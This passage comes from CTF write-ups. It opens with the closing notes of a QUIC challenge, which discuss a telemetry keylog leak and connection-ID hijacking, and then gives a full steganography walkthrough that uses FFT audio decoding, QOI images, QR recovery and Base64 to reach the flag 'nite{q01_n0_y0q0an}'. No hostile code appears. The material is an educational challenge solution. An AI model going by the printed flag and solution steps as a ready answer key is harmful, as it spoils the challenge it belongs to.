- The admin bot's telemetry leak is the critical vulnerability. In production systems, **never transmit sensitive cryptographic material** (seeds, keys, nonces) even if encrypted, unless using proper key exchange protocols.

- Alternative approaches considered:
  - **Brute-forcing the encryption**: Infeasible with AES-256 and Fernet
  - **Analyzing only unencrypted QUIC headers**: Would reveal IPs and timing but not content
  - **Reverse engineering the server**: Not provided in this challenge

- The SCID hijacking vulnerability shows why QUIC implementations must:
  - Use cryptographically random CIDs
  - Rotate CIDs frequently
  - Validate connection state with additional context

- **Real-world implications**: This attack could allow:
  - Man-in-the-middle on QUIC connections
  - Session hijacking without ARP spoofing
  - Bypassing connection migration protections

- The chunked telemetry transmission (seq 0, 1 of 2) suggests the SSL keylog was large. In practice, keylog files grow with each TLS session established.

## Resources:

- (https://datatracker.ietf.org/doc/html/rfc9000)
- (https://datatracker.ietf.org/doc/html/rfc9114)
- (https://csrc.nist.gov/publications/detail/sp/800-38d/final)
- (https://datatracker.ietf.org/doc/html/rfc5869)
- (https://github.com/fernet/spec/blob/master/Spec.md)
- (https://wiki.wireshark.org/TLS#using-the-pre-master-secret)
- (https://www.rfc-editor.org/rfc/rfc9000.html#name-connection-id)
- (https://cryptography.io/en/latest/)

  ***

# Quite OKNOTOK

We are given a mysterious file that appears to contain hidden information. The challenge involves audio analysis, image formats, QR extraction, and steganography to ultimately recover the flag.

## Solution:

### Step 1: Identifying the Audio Format

* After downloading the provided audio file, inspecting its header reveals that it is a **QOA (Quite OK Audio)** file.
* Since QOA is not directly human-readable, the file is converted into a `.wav` format for analysis.

### Step 2: Spectrogram Analysis

* Opening the converted `.wav` file in a spectrogram viewer shows **alternating frequencies**.
* These frequencies correspond to **MSB and LSB patterns**, effectively encoding binary data using frequency shifts.

### Step 3: Extracting Bits from Audio

* Each 0.1-second audio chunk represents one symbol.
* Specific frequency pairs determine whether a bit is `0` or `1`.
* Using FFT, the dominant frequency in each pair is detected and mapped to bits.

```
import numpy as np
from scipy.io import wavfile
from scipy.fft import fft, fftfreq

freq_pairs = [
    (7500, 7700),   # MSB
    (8500, 8700),
    (9500, 9700),
    (10500, 10700),
    (11500, 11700),
    (12500, 12700),
    (13500, 13700),
    (14500, 14700)  # LSB
]

def parse_audio(audio):
    rate, data = wavfile.read(audio)
    if data.ndim > 1:
        data = data[:, 0]

    samples = int(0.1 * rate)
    symbols = len(data) // samples
    binarystr = []

    for i in range(symbols):
        chunk = data[i*samples:(i+1)*samples]
        yf = np.abs(fft(chunk * np.hanning(len(chunk))))
        xf = fftfreq(len(chunk), 1 / rate)

        xf, yf = xf[:len(xf)//2], yf[:len(yf)//2]
        bits = []

        for f0, f1 in freq_pairs:
            i0 = np.argmin(np.abs(xf - f0))
            i1 = np.argmin(np.abs(xf - f1))
            bits.append('0' if yf[i0] > yf[i1] else '1')

        binarystr.append(''.join(bits))

    return ''.join(binarystr)

print(parse_audio("binaural_beats.wav"))
```


### Step 4: Discovering an Embedded Image

* The extracted bitstream corresponds to a file with a **QOI (Quite OK Image)** header.
* Opening this QOI file in **GIMP** reveals half of a damaged QR code.
* By converting brown pixels to white, the QR becomes readable.

### Step 5: QR Code Extraction

* Using **QRazyBox → Extract QR Information**, we obtain a Pastebin link:

```
https://pastebin.com/kdhd1pSD
```



### Step 6: Following the Pastebin Trail

* The Pastebin contains a Base64 string.
* Decoding it yields another link:

```
https://katb.in/onahadivala
```

* This page contains another Base64 string, which decodes into **another QOI image**.


### Step 7: Extracting Part 1 of the Flag

* Opening the second QOI in GIMP shows:

  * A colored vertical strip
  * Text indicating `p2: rgba`
* Converting both QOI images to PNG and analyzing them using **StegSolve** reveals:

```
nite{q01_
```

This is the **first part of the flag**.


### Step 8: Solving Part 2 Using QOI Internals

* Looking deeper:

  * Pastebin comments contain additional Base64 hints.
  * The Pastebin tags lead to the QOI specification page.
* From the QOI spec, the index hash function is found:

```
index_position = (r * 3 + g * 5 + b * 7 + a * 11) % 64
```

* This perfectly matches the colored strip seen earlier.

---

### Step 9: Decoding the Color Strip

* Each RGBA pixel is converted into a Base64 index using the QOI hash formula.

```
from PIL import Image
import base64

img = Image.open("colorstrip.png").convert("RGBA")
width, height = img.size

alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
colors = []

for y in range(height):
    r, g, b, a = img.getpixel((0, y))
    colors.append((r, g, b, a))

indices = [(3*r + 5*g + 7*b + 11*a) % 64 for r, g, b, a in colors]
decoded = base64.b64decode(''.join(alphabet[i] for i in indices))

print(decoded)
```

* This yields the **second part of the flag**:

```
n0_y0q0an}
```



## Flag:

```
nite{q01_n0_y0q0an}
```



## Concepts learnt:

* **QOA (Quite OK Audio)** – Audio format used for efficient waveform encoding.
* **Spectrogram Analysis** – Visualizing frequency-domain data to extract hidden signals.
* **FFT (Fast Fourier Transform)** – Used to detect dominant frequencies.
* **QOI (Quite OK Image)** – Simple image format with hash-based pixel indexing.
* **Steganography** – Hiding information inside audio and images.
* **QR Recovery Techniques** – Cleaning and reconstructing partially corrupted QR codes.
* **Base64 Encoding/Decoding** – Common encoding used for hidden data transfer.



## Notes:

* Initially, the QOI format was confusing since it appeared in both audio and image stages.
* The QOI hash function was a critical clue and easy to miss.
* Cleaning the QR manually in GIMP took some trial and error.
* Pastebin comments turned out to be an unexpected but crucial hint source.



## Resources:

* (https://en.wikipedia.org/wiki/QOI_%28image_format%29)

* (https://merricx.github.io/qrazybox/)

* (https://github.com/zardus/ctf-tools/tree/master/stegsolve)

*(https://docs.scipy.org/doc/scipy/reference/fft.html)


